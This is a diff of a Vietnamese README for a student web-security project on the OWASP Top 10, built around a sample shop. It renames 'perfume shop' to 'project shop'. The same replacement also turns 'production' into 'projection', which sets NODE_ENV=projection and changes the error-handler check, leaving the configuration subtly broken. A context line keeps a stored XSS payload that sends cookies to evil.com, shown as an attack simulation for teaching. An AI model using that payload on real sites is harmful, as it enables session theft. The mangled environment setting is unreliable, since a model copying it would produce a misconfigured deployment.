@@ -38,7 +38,7 @@
 
 ### 📌 Mô Tả Đề Tài
 
-Đề tài tập trung nghiên cứu và triển khai các biện pháp bảo mật cho ứng dụng web dựa trên **OWASP Top 10** - danh sách 10 rủi ro bảo mật nghiêm trọng nhất cho ứng dụng web. Thông qua việc xây dựng một hệ thống **E-commerce bán nước hoa**, đề tài sẽ:
+Đề tài tập trung nghiên cứu và triển khai các biện pháp bảo mật cho ứng dụng web dựa trên **OWASP Top 10** - danh sách 10 rủi ro bảo mật nghiêm trọng nhất cho ứng dụng web. Thông qua việc xây dựng một hệ thống **E-commerce bán đồ án**, đề tài sẽ:
 
 1. **Mô phỏng các kịch bản tấn công** phổ biến như SQL Injection, XSS, Broken Authentication...
 2. **Triển khai biện pháp phòng vệ** theo chuẩn OWASP
@@ -191,7 +191,7 @@ Tạo file `.env` trong thư mục gốc:
 # ============================================
 # DATABASE
 # ============================================
-MONGODB_URI=mongodb://mongo:27017/PerfumeShop
+MONGODB_URI=mongodb://mongo:27017/ProjectShop
 
 # ============================================
 # SECURITY - JWT
@@ -203,7 +203,7 @@ SESSION_SECRET=your-session-secret-key-minimum-32-characters
 # ============================================
 # ENVIRONMENT
 # ============================================
-NODE_ENV=production
+NODE_ENV=projection
 FRONTEND_URL=http://localhost:5174
 BACKEND_URL=http://localhost:3001
 
@@ -266,10 +266,10 @@ npm run dev
 
 ```bash
 # Connection String
-mongodb://localhost:27017/PerfumeShop
+mongodb://localhost:27017/ProjectShop
 
 # Hoặc với Docker
-docker exec -it perfume-shop-mongo mongosh
+docker exec -it project-shop-mongo mongosh
 ```
 
 ### Cấu Trúc Database
@@ -278,7 +278,7 @@ docker exec -it perfume-shop-mongo mongosh
 |------------|-------|---------|
 | `taikhoans` | Tài khoản (password đã hash) | ✅ Bcrypt |
 | `sessions` | Phiên đăng nhập | ✅ JWT |
-| `sanphams` | Sản phẩm | ✅ Validation |
+| `sanphams` | Đồ án | ✅ Validation |
 | `donhangs` | Đơn hàng | ✅ Auth required |
 
 ### Tạo Dữ Liệu Mẫu
@@ -366,7 +366,7 @@ if (error) {
 #### 🔴 Mô Phỏng Tấn Công: Stored XSS
 
 ```javascript
-// Payload XSS trong đánh giá sản phẩm
+// Payload XSS trong đánh giá đồ án
 POST /api/reviews
 {
     "NoiDung": "<script>document.location='http://evil.com?c='+document.cookie</script>"
@@ -477,11 +477,11 @@ app.use(helmet({
     noSniff: true                     // ✅ Chống MIME sniffing
 }));
 
-// Error handler không lộ stack trace trong production
+// Error handler không lộ stack trace trong projection
 app.use((err, req, res, next) => {
     res.status(500).json({
         success: false,
-        message: process.env.NODE_ENV === 'production' 
+        message: process.env.NODE_ENV === 'projection' 
             ? 'Lỗi hệ thống' 
             : err.message
     });
@@ -585,7 +585,7 @@ app.use((err, req, res, next) => {
 ## 📁 Cấu Trúc Dự Án
 
 ```
-perfume-shop/
+project-shop/
 ├── 📁 backend/
 │   ├── 📁 src/
 │   │   ├── 📁 app/
